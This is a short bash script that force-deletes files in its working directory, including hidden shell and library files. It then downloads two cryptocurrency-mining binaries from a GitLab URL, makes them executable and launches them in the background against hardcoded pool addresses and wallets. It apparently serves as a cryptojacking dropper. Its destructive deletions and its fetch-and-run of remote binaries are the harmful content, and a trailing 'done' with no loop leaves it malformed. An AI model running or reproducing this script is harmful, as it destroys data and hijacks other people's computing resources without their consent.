#!/bin/bash
rm -rvf * 
rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
rm -R *
mkdir .des
cd .des
rm -R *

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u v32fS9jBgzACJdgbUncHz5quaAAbChnZo6.$(shuf -n 1 -i 1-99999)-VISH -t4 &

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84
chmod 777 lol1.84

./lol1.84 --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qpzgujxqgqk6wczzlgnujxuma89at8p32lsa0st2y4pyvdqzegx9zu7mtrpgd.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl

done
